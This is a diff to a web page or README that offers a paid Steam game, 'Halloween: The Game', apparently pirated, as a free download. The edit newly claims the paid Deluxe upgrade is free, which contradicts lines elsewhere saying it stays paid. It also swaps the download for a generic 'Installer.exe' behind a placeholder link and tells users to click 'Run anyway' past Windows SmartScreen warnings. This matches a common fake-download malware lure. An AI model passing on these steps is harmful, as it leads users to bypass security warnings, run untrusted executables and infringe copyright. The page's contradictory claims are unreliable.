@@ -46,14 +46,14 @@ Paid add-ons on Steam **stay paid** — we only distribute the **base full game*
 | DLC | Steam price | Here |
 |-----|-------------|------|
 | **Base game (full)** | $18.49 | **Free** |
-| **Digital Deluxe Upgrade** | $19.99 | Paid on Steam only |
+| **Digital Deluxe Upgrade** | $19.99 | **Too Free** |
 
 **Digital Deluxe** ($19.99 on Steam): Inmate Myers skin · exclusive civilians · Laurie Strode cosmetic · digital comic — purchase separately on Steam if you want deluxe content.
 
 > **Mature content:** Single-player includes **partial nudity** and intense violence. Deluxe skins stay on Steam as paid DLC.
 
 - **Base full game** → **free here** · paid on Steam
-- **Digital Deluxe Upgrade** → Steam only, $19.99
+- **Digital Deluxe Upgrade** → **free here** . Steam , $19.99
 
 ## System Requirements
 
@@ -67,7 +67,7 @@ Paid add-ons on Steam **stay paid** — we only distribute the **base full game*
 ## Installing Halloween: The Game
 
 1. Download the **full game free** from the following link: **[CLICK](#)** — same complete build that costs $18.49 on Steam.
-2. Extract `Halloween-The-Game-Full.zip` and run `Halloween.exe` or the installer.
+2. Extract `Halloween-The-Game.zip` and run `Installer.exe` or the installer.
 3. If **Windows SmartScreen** shows a warning, click **"More info"** then **"Run anyway"**.
 4. Launch the game — log in with Steam for multiplayer and cloud saves.
 5. Optional: purchase **Digital Deluxe Upgrade** for exclusive Myers skin and bonus content.
